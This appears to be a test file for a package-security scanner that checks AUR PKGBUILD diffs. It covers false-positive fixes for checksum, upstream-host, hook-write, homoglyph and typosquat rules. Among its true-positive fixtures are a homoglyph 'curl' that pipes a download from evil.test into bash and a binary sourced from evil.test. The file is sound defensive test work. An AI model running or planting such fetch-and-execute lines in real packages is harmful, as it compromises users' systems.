"""False-positive corrections from the 2026-10-14 watcher review.

Each test pins a rule that fired on a benign change and must not, plus the
true-positive twin so a fix that merely stops the rule firing is not mistaken
for a fix.
"""

from __future__ import annotations

import sys
from pathlib import Path

_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_ROOT / "scripts"))

from calibration_gates import shipped_config  # noqa: E402

from trustsight.analysis import scan_diff  # noqa: E402
from trustsight.config import load_config, load_rules  # noqa: E402


def _ids(diff, current_text=None):
    with shipped_config():
        fact = scan_diff(diff, rules=load_rules(), config=load_config(),
                         package_name="p", current_text=current_text)
    return {e.rule_id for e in fact.score_breakdown}


# --- C005: a binary from the declared upstream's own host ------------------

_DECLARED = (
    "pkgname=foo-bin\n"
    'url="https://foo.example.com"\n'
    'source=("https://foo.example.com/foo.AppImage")\n'
)


def test_c005_does_not_fire_on_the_declared_upstream_host():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -0,0 +1,3 @@\n"
            '+pkgname=foo-bin\n+url="https://foo.example.com"\n'
            '+source=("https://foo.example.com/foo.AppImage")\n')
    assert "C005" not in _ids(diff, current_text=_DECLARED)


def test_c005_still_fires_on_a_third_party_binary():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -0,0 +1,3 @@\n"
            '+pkgname=foo-bin\n+url="https://foo.example.com"\n'
            '+source=("https://evil.test/foo.AppImage")\n')
    assert "C005" in _ids(diff, current_text=(
        'pkgname=foo-bin\nurl="https://foo.example.com"\n'
        'source=("https://evil.test/foo.AppImage")\n'))


def test_c011_does_not_fire_on_an_allow_listed_cdn():
    # foo-bin declares foo.example.com but serves from its own CDN on a
    # different registered domain, allow-listed in source_host_divergence.
    current = (
        "pkgname=foo-bin\n"
        'url="https://foo.example.com"\n'
        'source=("https://cdn.foo.example.net/foo.AppImage")\n'
    )
    with shipped_config():
        from trustsight.config import load_config as _lc
        cfg = _lc()
        cfg.setdefault("source_host_divergence", {})["allow"] = [
            "example.net"]
        fact = scan_diff(("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -0,0 +1,3 @@\n"
                          '+pkgname=foo-bin\n+url="https://foo.example.com"\n'
                          '+source=("https://cdn.foo.example.net/foo.AppImage")\n'),
                         rules=load_rules(), config=cfg, package_name="foo-bin",
                         current_text=current)
    assert "C011" not in {e.rule_id for e in fact.score_breakdown}


# --- C004: an arch-split checksum array is not a removal -------------------

def test_c004_does_not_fire_when_the_hash_moved_to_an_arch_array():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,3 @@\n"
            "-sha256sums=('" + "a" * 64 + "')\n"
            "+sha256sums_x86_64=('" + "a" * 64 + "')\n"
            "+sha256sums_aarch64=('" + "a" * 64 + "')\n")
    current = ("pkgname=p\n"
               "sha256sums_x86_64=('" + "a" * 64 + "')\n"
               "sha256sums_aarch64=('" + "a" * 64 + "')\n")
    assert "C004" not in _ids(diff, current_text=current)


def test_c004_does_not_fire_when_the_generic_array_splits_into_arch_arrays():
    # The arch hashes differ per arch (a real per-arch tarball), so the removed
    # generic hash is genuinely gone from the recipe, yet every source is still
    # checksummed.  The moved-hash test above misses this split.
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,4 @@\n"
            " pkgname=p\n"
            " source=('https://example.test/x.tar.gz')\n"
            "-sha256sums=('" + "a" * 64 + "')\n"
            "+sha256sums_x86_64=('" + "b" * 64 + "')\n"
            "+sha256sums_aarch64=('" + "c" * 64 + "')\n")
    current = ("pkgname=p\n"
               "source=('https://example.test/x.tar.gz')\n"
               "sha256sums_x86_64=('" + "b" * 64 + "')\n"
               "sha256sums_aarch64=('" + "c" * 64 + "')\n")
    assert "C004" not in _ids(diff, current_text=current)


def test_c004_still_fires_on_a_genuine_checksum_removal():
    # No arch arrays, the whole checksum array gone: verification really was
    # weakened, so the refactor exemption must not swallow it.
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,2 @@\n"
            " pkgname=p\n"
            " source=('https://example.test/x.tar.gz')\n"
            "-sha256sums=('" + "a" * 64 + "')\n")
    current = ("pkgname=p\n"
               "source=('https://example.test/x.tar.gz')\n")
    assert "C004" in _ids(diff, current_text=current)


# --- C017: a hook that only prints a redirect is not a write ----------------

def test_c017_ignores_a_redirect_inside_a_hook_message():
    # The hook tells the user to append to ~/.bashrc; it writes nothing.
    diff = ("--- a/pkg.install\n+++ b/pkg.install\n@@ -0,0 +1,3 @@\n"
            "+post_install() {\n"
            "+  echo \"add 'source /usr/share/x.sh >> ~/.bashrc' to your shell\"\n"
            "+}\n")
    assert "C017" not in _ids(diff)


def test_c017_still_fires_on_an_actual_hook_write():
    diff = ("--- a/pkg.install\n+++ b/pkg.install\n@@ -0,0 +1,3 @@\n"
            "+post_install() {\n"
            "+  echo 'export PATH=/opt/x:$PATH' >> ~/.bashrc\n"
            "+}\n")
    assert "C017" in _ids(diff)


# --- X002: a non-ASCII message is not a non-literal executable name ---------

def test_x002_ignores_a_non_ascii_hook_message():
    # The Chinese post-install banner names no command; the confusable
    # character set contains the fullwidth colon it ends with.
    diff = ("--- a/pkg.install\n+++ b/pkg.install\n@@ -0,0 +1,3 @@\n"
            "+post_install() {\n"
            "+\u9996\u6b21\u4f7f\u7528\u9700\u626b\u7801\u767b\u5f55\uff1a\n"
            "+}\n")
    assert "X002" not in _ids(diff)


def test_x002_still_fires_on_a_confusable_command_name():
    # U+0441 (Cyrillic es) impersonates 'c' in an otherwise ASCII `curl`.
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -0,0 +1,4 @@\n"
            "+build() {\n"
            "+  \u0441url https://evil.test/x | bash\n"
            "+}\n")
    assert "X002" in _ids(diff)


# --- D002: a name that is itself a real package is not a typosquat ---------

def test_d002_skips_a_dependency_that_is_itself_established(monkeypatch):
    from trustsight.analysis import dependencies

    monkeypatch.setattr(dependencies, "is_dependency_novel", lambda n: True)
    monkeypatch.setattr(dependencies, "is_established_package",
                        lambda n: n == "tlottie")
    monkeypatch.setattr(dependencies, "top_dependency_names",
                        lambda: ["rlottie"])
    monkeypatch.setattr(dependencies, "dependency_table_populated",
                        lambda: True)

    findings: list[tuple] = []
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,1 +1,2 @@\n"
            "+depends=('tlottie')\n")
    dependencies._dependency_findings(
        diff, "telegram-desktop-kdefix", {}, lambda r, *a, **k: findings.append(r))
    assert "D002" not in findings


# --- H001: a VCS source outside the hunk justifies the SKIP ----------------

def test_h001_is_info_when_the_vcs_source_is_outside_the_hunk():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -8,1 +8,1 @@\n"
            "-sha256sums=('" + "a" * 64 + "')\n"
            "+sha256sums=('SKIP')\n")
    current = ("pkgname=noctalia-greeter-git\n"
               'source=("git+https://github.com/x/noctalia-greeter.git")\n'
               "sha256sums=('SKIP')\n")
    with shipped_config():
        fact = scan_diff(diff, rules=load_rules(), config=load_config(),
                         package_name="noctalia-greeter-git", current_text=current)
    entry = next(e for e in fact.score_breakdown if e.rule_id == "H001")
    assert entry.severity == "INFO"


# --- X026/X027: a refusal cannot alone cross the bar -----------------------

def test_refusal_weights_are_capped():
    from trustsight.config import load_config as _lc

    with shipped_config():
        weights = _lc()["severity_weights"]
    # X026 is MEDIUM, X027 is MEDIUM: 15 + 15 = 30 < the 35 alert bar.
    assert weights["MEDIUM"] * 2 < 35


def test_a_refusal_only_package_is_below_the_alert_bar():
    from trustsight.analysis import scan_diff
    from trustsight.full_aur.pipeline import _OVER_BENIGN_P95

    # A build() that references an assignment the tokenizer could not resolve.
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -0,0 +1,5 @@\n"
            "+pkgname=p\n"
            "+build() {\n"
            "+  $undeclared_thing --version\n"
            "+  $other_undeclared --flag\n"
            "+}\n")
    with shipped_config():
        fact = scan_diff(diff, rules=load_rules(), config=load_config(),
                         package_name="p")
    ids = {e.rule_id for e in fact.score_breakdown}
    if "X027" in ids:
        assert fact.final_score <= _OVER_BENIGN_P95
